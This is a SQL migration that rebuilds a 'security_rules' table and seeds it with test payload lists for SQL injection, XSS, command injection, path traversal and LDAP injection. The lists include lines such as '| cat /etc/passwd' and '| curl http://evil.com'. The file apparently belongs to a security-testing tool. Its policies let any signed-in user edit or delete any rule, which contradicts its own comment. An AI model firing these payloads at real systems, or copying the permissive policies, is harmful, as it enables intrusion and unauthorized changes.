/*
  # Redesign Security Rules as Payload Collections

  1. Changes
    - Remove old security_rules structure
    - Recreate as payload collections similar to checklists
    - Store name, description, and array of payloads
    - Each rule contains test payloads for append operations

  2. Structure
    - `security_rules` table
      - `id` (uuid, primary key)
      - `name` (text) - e.g., "SQL Injection", "XSS", "Command Injection"
      - `description` (text) - optional description
      - `payloads` (text[]) - array of payload strings
      - `created_at` (timestamptz)
      - `updated_at` (timestamptz)

  3. Security
    - Enable RLS
    - Allow authenticated users to read all rules
    - Allow authenticated users to create/update/delete their own rules
*/

-- Drop existing table if it exists
DROP TABLE IF EXISTS security_rules CASCADE;

-- Create new security_rules table
CREATE TABLE IF NOT EXISTS security_rules (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  name text NOT NULL,
  description text,
  payloads text[] NOT NULL DEFAULT '{}'::text[],
  created_at timestamptz DEFAULT now(),
  updated_at timestamptz DEFAULT now()
);

-- Enable RLS
ALTER TABLE security_rules ENABLE ROW LEVEL SECURITY;

-- RLS policies
CREATE POLICY "Users can view all security rules"
  ON security_rules FOR SELECT
  TO authenticated
  USING (true);

CREATE POLICY "Users can create security rules"
  ON security_rules FOR INSERT
  TO authenticated
  WITH CHECK (true);

CREATE POLICY "Users can update security rules"
  ON security_rules FOR UPDATE
  TO authenticated
  USING (true)
  WITH CHECK (true);

CREATE POLICY "Users can delete security rules"
  ON security_rules FOR DELETE
  TO authenticated
  USING (true);

-- Insert some default security rules
INSERT INTO security_rules (name, description, payloads) VALUES
  ('SQL Injection', 'Common SQL injection payloads', 
   ARRAY[$$ OR '1'='1$$, $$ OR 1=1--$$, $$ OR 'a'='a$$, $$admin'--$$, $$ UNION SELECT NULL--$$, $$1' OR '1'='1'--$$]),
  ('XSS (Cross-Site Scripting)', 'Cross-site scripting test payloads', 
   ARRAY['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', 'javascript:alert(1)', '<svg onload=alert(1)>', $$'><script>alert(1)</script>$$]),
  ('Command Injection', 'OS command injection payloads', 
   ARRAY['; ls -la', '| cat /etc/passwd', '&& whoami', '; ping -c 10 127.0.0.1', '| curl http://evil.com']),
  ('Path Traversal', 'Directory traversal payloads', 
   ARRAY['../', '../../etc/passwd', '....//....//etc/passwd', $$..\\..\\windows\\system32$$, '/etc/passwd']),
  ('LDAP Injection', 'LDAP injection payloads', 
   ARRAY['*', '*)(&', '*)(|(objectClass=*', 'admin*', '*)(!(&(objectClass=*))']);
